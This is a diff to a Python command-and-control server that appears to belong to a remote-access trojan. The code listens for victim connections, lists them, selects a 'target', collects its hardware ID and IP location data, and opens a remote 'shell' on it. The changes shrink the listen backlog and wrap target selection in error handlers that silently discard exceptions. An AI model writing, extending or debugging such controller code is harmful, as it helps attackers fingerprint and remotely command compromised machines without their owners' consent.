@@ -72,7 +72,7 @@ def socket_bind():
         host, port = socket_settings()
         global ss
         ss.bind((host, int(port)))
-        ss.listen(5)
+        ss.listen(1)
         print(f"\n[*] Listening on {host}:{port}")
     except socket.error as e:
         print(f"\n[!] Socket binding error: {e}")
@@ -153,8 +153,8 @@ def target_info(conn):
         client_ip = client_ipaddr.split(maxsplit=1)[0]
 
         return hwid, client_ip
-    except socket.error as e:
-        print(f"\n[!] Connection to client was lost {e}")
+    except (socket.error, AttributeError, IndexError) as e:
+        pass
 
 def parse_target_ip(target_ip):
     try:
@@ -173,11 +173,14 @@ def command_menu():
             case "list":
                 list_connections()
             case s if s.startswith("select"):
-                conn = get_target(cmd)
-                hwid, target_ip = target_info(conn)
-                target_ip_info = parse_target_ip(target_ip)
-                print(f"\n[+] hwid: {hwid}\n[+] ip info:\n{target_ip_info}\n[$] ")
-                if conn is not None:
+                try:
+                    conn = get_target(cmd)
+                    hwid, target_ip = target_info(conn)
+                    target_ip_info = parse_target_ip(target_ip)
+                    print(f"\n[+] hwid: {hwid}\n[+] ip info:\n{target_ip_info}\n[$] ")
+                    if conn is not None:
+                        pass
+                except TypeError as e:
                     pass
             case "shell" | "sh":
                     get_target_commands(conn) 
